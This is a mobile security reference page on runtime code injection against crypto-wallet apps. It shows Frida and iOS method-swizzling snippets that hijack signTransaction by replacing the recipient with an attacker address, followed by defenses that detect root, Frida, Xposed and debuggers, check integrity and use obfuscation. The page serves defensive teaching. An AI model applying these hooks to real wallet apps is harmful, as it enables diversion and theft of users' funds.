# Dynamic Code Injection Attack

## 📋 Attack Information
**Category**: Mobile Runtime Attack | **Severity**: 🔴 High (CVSS 8.0)

## 🎯 Attack Principle
Attacker injects malicious code at runtime using frameworks like Frida, Xposed, or Cydia Substrate.

## 💀 Attack Methods

### 1. Frida Hook
```javascript
// Hook wallet's sign function
Java.perform(function() {
    var WalletManager = Java.use('com.wallet.WalletManager');
    
    WalletManager.signTransaction.implementation = function(tx) {
        // Intercept transaction
        var originalTo = tx.to;
        
        // Change recipient to attacker
        tx.to = 'ATTACKER_ADDRESS';
        
        console.log('Hijacked transaction!');
        console.log('Original:', originalTo);
        console.log('Modified:', tx.to);
        
        // Call original function with modified tx
        return this.signTransaction(tx);
    };
});
```

### 2. Method Swizzling (iOS)
```swift
// Objective-C runtime manipulation
@implementation WalletManager (Swizzled)

+ (void)load {
    Method original = class_getInstanceMethod(self, @selector(signTransaction:));
    Method swizzled = class_getInstanceMethod(self, @selector(swizzled_signTransaction:));
    method_exchangeImplementations(original, swizzled);
}

- (NSData *)swizzled_signTransaction:(Transaction *)tx {
    // Modify transaction
    tx.recipient = @"ATTACKER_ADDRESS";
    
    // Call original (swizzled) method
    return [self swizzled_signTransaction:tx];
}
```

## 🛡️ Defense Measures

### 1. Root/Jailbreak Detection
```kotlin
// ✅ Comprehensive detection
fun isDeviceCompromised(): Boolean {
    // Check root
    if (isRooted()) return true
    
    // Check for Xposed
    if (isXposedInstalled()) return true
    
    // Check for Frida
    if (isFridaRunning()) return true
    
    // Check for Substrate (iOS)
    if (isSubstrateLoaded()) return true
    
    return false
}

fun isFridaRunning(): Boolean {
    // Check for Frida server port
    try {
        Socket("127.0.0.1", 27042).use {
            return true // Frida server running
        }
    } catch (e: Exception) {
        // Port not open
    }
    
    // Check for loaded libraries
    val mapsFile = File("/proc/self/maps")
    val maps = mapsFile.readText()
    
    return maps.contains("frida") || 
           maps.contains("substrate") ||
           maps.contains("xposed")
}
```

### 2. Anti-Debugging
```kotlin
// ✅ Detect debugger attachment
fun isBeingDebugged(): Boolean {
    // Check debug flag
    if ((applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0) {
        return true
    }
    
    // Check TracerPid
    try {
        val status = File("/proc/self/status").readText()
        val tracerPid = status.lines()
            .find { it.startsWith("TracerPid:") }
            ?.split(":")?.get(1)?.trim()?.toInt() ?: 0
        
        if (tracerPid != 0) {
            return true // Being traced
        }
    } catch (e: Exception) {
        // Error reading - suspicious
        return true
    }
    
    return false
}

// Exit if debugged
if (isBeingDebugged()) {
    exitProcess(0)
}
```

### 3. Integrity Checks
```kotlin
// ✅ Verify code hasn't been modified
fun verifyIntegrity(): Boolean {
    // Check APK signature
    val signature = packageManager
        .getPackageInfo(packageName, PackageManager.GET_SIGNATURES)
        .signatures[0]
    
    val sha256 = MessageDigest.getInstance("SHA-256")
        .digest(signature.toByteArray())
    
    val expected = "OFFICIAL_SIGNATURE_HASH"
    val actual = sha256.toHex()
    
    if (actual != expected) {
        AlertDialog.Builder(this)
            .setTitle("Integrity Check Failed")
            .setMessage("App may have been modified")
            .setPositiveButton("Exit") { _, _ -> finish() }
            .show()
        
        return false
    }
    
    return true
}
```

### 4. Obfuscation
```kotlin
// ✅ Make code harder to hook
// ProGuard/R8
android {
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
        }
    }
}

// Use native code for critical functions
external fun signTransaction(tx: ByteArray): ByteArray

// Native C++ is harder to hook than Java/Kotlin
```

### 5. Runtime Environment Validation
```typescript
// React Native
import { NativeModules } from 'react-native';

async function validateEnvironment(): Promise<boolean> {
  // Check if running on emulator
  const isEmulator = await NativeModules.DeviceInfo.isEmulator();
  
  // Check if rooted
  const isRooted = await NativeModules.SecurityModule.isRooted();
  
  // Check for hooking
  const isHooked = await NativeModules.SecurityModule.detectHooking();
  
  if (isEmulator || isRooted || isHooked) {
    Alert.alert(
      'Security Warning',
      'Cannot run in this environment',
      [{ text: 'Exit', onPress: () => RNExitApp.exitApp() }]
    );
    return false;
  }
  
  return true;
}

// Check on app start
useEffect(() => {
  validateEnvironment();
}, []);
```

## ✅ Best Practices

```
Detection:
□ Detect root/jailbreak
□ Detect Xposed/Substrate
□ Detect Frida
□ Detect debugger attachment
□ Check running processes

Protection:
□ Verify app integrity
□ Use code obfuscation
□ Implement anti-debugging
□ Use native code for sensitive operations
□ Runtime environment validation

Response:
□ Exit app if compromised environment
□ Disable sensitive features
□ Log security events
□ Alert user about risks
```

**Created**: November 11, 2025

